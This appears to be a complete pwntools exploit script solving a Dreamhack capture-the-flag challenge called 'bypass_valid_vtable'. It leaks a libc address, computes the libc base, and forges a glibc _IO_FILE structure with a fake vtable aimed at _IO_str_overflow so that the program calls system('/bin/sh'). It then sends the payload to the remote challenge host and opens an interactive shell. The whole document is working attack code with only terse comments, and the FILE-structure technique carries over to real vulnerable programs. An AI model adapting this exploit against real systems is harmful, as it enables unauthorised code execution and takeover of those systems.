from pwn import *

def slog(symbol, addr): return success(symbol + ": " + hex(addr))
context.log_level = 'debug'

# p = process("./bypass_valid_vtable", env={"LD_PRELOAD":"./libc.so.6"})
p = remote("host1.dreamhack.games", 22340)
e = ELF("./bypass_valid_vtable")
libc = ELF("./libc.so.6")

# gdb.attach(p)

p.recvuntil("stdout: ")
stdout_addr = int(p.recvuntil(b"\n").strip(b"\n"),16)

libc_base = stdout_addr - libc.symbols["_IO_2_1_stdout_"]
io_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
# io_str_overflow = libc_base+libc.symbols['_IO_str_overflow']
io_str_overflow = io_file_jumps+0xd8
system_addr = libc_base + libc.symbols["system"]

slog("libc_base", libc_base)
slog("stdout", stdout_addr)
slog("io_jump", libc_base+libc.symbols['_IO_file_jumps'])
slog("io_str_overflow", io_str_overflow)

# finish in vtable+0x10 overflow in vtable+0x18
# make call fake_vtable+0x10 == vtable+0xd8 (io_srt_overflow() addr)
fake_vtable = io_str_overflow-0x10
binsh = libc_base + next(libc.search(b"/bin/sh"))
fp = e.symbols["fp"]

payload = p64(0x0) # flags
payload += p64(0x0) # _IO_read_ptr
payload += p64(0x0) # _IO_read_end
payload += p64(0x0) # _IO_read_base
payload += p64(0x0) # _IO_write_base
# ~ -100 // 2 for ptr calculation in io_str_overflow()
# _IO_size_t new_size = 2 * old_blen + 100;
payload += p64( (binsh - 100) // 2 ) # _IO_write_ptr 
payload += p64(0x0) # _IO_write_end
payload += p64(0x0) # _IO_buf_base
payload += p64( (binsh - 100) // 2 ) # _IO_buf_end 
payload += p64(0x0) # _IO_save_base
payload += p64(0x0) # _IO_backup_base
payload += p64(0x0) # _IO_save_end
payload += p64(0x0) # _IO_marker
payload += p64(0x0) # _IO_chain
payload += p64(0x0) # _fileno
payload += p64(0x0) # _old_offset
payload += p64(0x0)
payload += p64(fp+0x100) # _lock ~ can write addr
payload += p64(0x0)*9
#vtables
payload += p64(fake_vtable)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()